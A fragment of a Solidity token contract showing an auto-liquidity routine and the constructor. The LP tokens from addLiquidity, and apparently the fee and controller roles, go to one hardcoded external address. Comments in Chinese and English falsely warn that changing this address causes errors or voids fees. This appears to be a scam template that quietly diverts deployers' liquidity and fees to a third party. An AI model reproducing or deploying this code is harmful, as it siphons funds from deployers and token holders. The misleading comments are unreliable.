        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {//=0xA8D8ba614ee5EF378FB6353C18F152d4E93b4cCE (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpFist, 0, 0, address(0x86291bA126EFcAc5199fc6f3047D25C7D5Bb7539), block.timestamp
                );
            }
        }
    }
...
contract tokens is AbsToken {
    constructor() AbsToken(
        ...
        18,//De
        300000,//Su 数量后面加20个0
        address(0x86291bA126EFcAc5199fc6f3047D25C7D5Bb7539),//The address controlled by the mechanism cannot be modified, and the handling fee will be voided after modification
        address(0x86291bA126EFcAc5199fc6f3047D25C7D5Bb7539)//
    ){
    }
}